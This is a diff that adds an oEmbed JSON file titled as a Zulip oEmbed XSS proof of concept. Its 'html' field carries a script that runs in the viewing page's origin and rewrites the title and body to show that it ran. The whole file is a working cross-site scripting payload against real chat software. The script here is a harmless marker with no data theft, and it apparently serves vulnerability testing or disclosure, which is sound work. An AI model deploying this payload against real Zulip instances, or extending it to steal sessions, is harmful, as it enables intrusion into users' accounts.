@@ -1,0 +1,11 @@
+{
+  "type": "video",
+  "version": "1.0",
+  "title": "Zulip oEmbed XSS PoC",
+  "width": 640,
+  "height": 480,
+  "thumbnail_url": "https://josangeorge.github.io/massah/thumb.png",
+  "thumbnail_width": 480,
+  "thumbnail_height": 360,
+  "html": "<script>document.title='XSS-CONFIRMED-'+location.origin;document.body.style.background='crimson';document.body.innerHTML='<h1 style=\"color:#fff;font-family:sans-serif;padding:40px\">Zulip oEmbed XSS PoC executed<br>origin: '+location.origin+'</h1>';</script>"
+}
